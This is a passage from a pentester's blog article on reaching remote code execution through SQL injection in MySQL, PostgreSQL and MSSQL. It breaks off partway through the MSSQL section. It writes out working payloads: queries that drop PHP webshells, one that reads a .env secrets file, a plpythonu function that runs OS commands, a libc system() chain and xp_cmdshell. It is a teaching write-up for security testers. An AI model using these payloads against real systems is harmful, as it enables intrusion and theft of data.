---
title: 5 Ways I Got RCE’s In the Wild
url: https://infosecwriteups.com/5-ways-i-got-rces-99a78901ba33?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2024-12-11
fetch_date: 2025-10-06T19:39:24.190621
---

# 5 Ways I Got RCE’s In the Wild

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F99a78901ba33&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-ways-i-got-rces-99a78901ba33&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2F5-ways-i-got-rces-99a78901ba33&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-99a78901ba33---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-99a78901ba33---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# 5 Ways I Got RCE’s In the Wild

[![Chux](https://miro.medium.com/v2/resize:fill:64:64/1*-Pj1VTDIzzhgaUUtZU7ypg.jpeg)](https://medium.com/%40red.whisperer?source=post_page---byline--99a78901ba33---------------------------------------)

[Chux](https://medium.com/%40red.whisperer?source=post_page---byline--99a78901ba33---------------------------------------)

10 min read

·

Dec 7, 2024

--

4

Listen

Share

For offensive security professionals, finding RCE vulnerabilities is usually a crown jewel for many black-box and white-box projects. These kind of vulnerabilities reside in many different ways, but there are some common functionalities to find them.

In this article we will explore common methods to achieve RCE, including SQL injection, command injection, path traversal, Local File Inclusion (LFI), and file upload vulnerabilities. For each attack vector, we’ll provide examples and real-world cases I had in my engagements to illustrate the impact.

![]()

## 1 — SQL Injection

SQL injections are well known as maybe the most famous web attack, providing the attacker control over the target’s database. But except for data exfiltration, SQL injection could be even more dangerous, allowing the attacker to execute commands over the OS of the target.

Remote Code Execution (RCE) through SQL injection can occur when attackers exploit vulnerabilities in database queries to execute system commands. Different database management systems (DBMS) like MySQL, PostgreSQL, and MSSQL provide varying capabilities for executing OS-level commands, which attackers can leverage under specific circumstances.

An important disclaimer here, is that the SQL service is the one that we are manipulating, not the web service (like Apache or Nginx). Hence, achieving RCE depends on the privileges the SQL service has on the target server.

### MySQL

Assuming that you found a SELECT statement that lets you to inject your malicious query, there are two main options you can work with. The first and the better option is using the `OUTFILE` function of MySQL. The `OUTFILE` option in MySQL is used to write the result of a query to a file on the server's filesystem. We can use this function to write, for example, a webshell by trying something like this:

```
' UNION SELECT "<?php exec($_GET['shell']) ?>" INTO OUTFILE "/var/www/html/upload.php";
```

I had an engagement that when I tried to do that I was getting error messages, indicating that the MySQL service doesn’t have enough permissions to write a file to the directories I tried. But then I changed the file path a few times and luckily I found a path that I can write a file in.

The second option in MySQL injection is to use the function `LOAD_FILE()`. The `LOAD_FILE()` function in MySQL is used to read the contents of a file located on the server and return it as a string. It is commonly used to fetch the contents of text-based files, such as configuration files or logs, into a query result.

If this function works, you might be able to use it as a path traversal attack in order to read sensitive files from the server, hoping to get something like SSH private keys or passwords. But this is not that promising like the previous function that me mentioned here.

### PostgreSQL

With PostgreSQL we also have few options available to use. The first one is by using the `COPY`function in order to create a new file, pretty similar to what we saw in the MySQL example before:

```
1; COPY (SELECT '<?php system($_GET["shell"]) ?>') TO '/var/www/html/chux.php'; --
```

For reading sensitive file on the system, we can use the `pg_read_file()`function:

```
SELECT pg_read_file('/var/www/html/.env',0,1000);
```

Another and more creative way to get RCE on this DBMS, is by using its scripting languages installed on the system to execute arbitrary code. The following query can tell us what scripting languages are supported in the target DB:

```
SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```

If you have a supported scripting language, you can use it for creating a custom script to execute whatever you want:

```
1; CREATE FUNCTION rce() RETURNS VOID AS $$
import os
os.system('echo pwned > /tmp/chux.txt')
$$ LANGUAGE plpythonu; SELECT rce(); --
```

For further reading about abusing PostgreSQL scripting language to achieve RCE, please read [this excellent guide here](https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.md).

And lastly for PostgreSQL, a [cool trick I learned from OWASP](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL) and I had the chance to use it on an e-commerce website I pentested, is to inject a custom function linked to libc.

In order to do so, we need the following steps:

* Create a table for the output (stdout)
* Run a shell command that referencing this output
* Use the COPY function to get the output of your shell command to the output table you created

The example in OWASP’s website looks like this:

```
/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --
/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'
STRICT --
/store.php?id=1; SELECT system('uname -a > /tmp/test') --
/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --
/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--
```

### MSSQL

Finally in the SQL injection category is the MSSQL. Here, there are some famous stored procedures that come to our help in order to run OS commands from the DB on the OS itself.

The native way MSSQL server lets us run OS commands is via `xp_cmdshell` . This stored procedure is disabled by default and can be activated only by the sa user, the system admin.

An example to a simple `xp_cmdshell` command:

```
EXEC xp_cmdshell 'ipconfig';
```

Assuming that you managed ...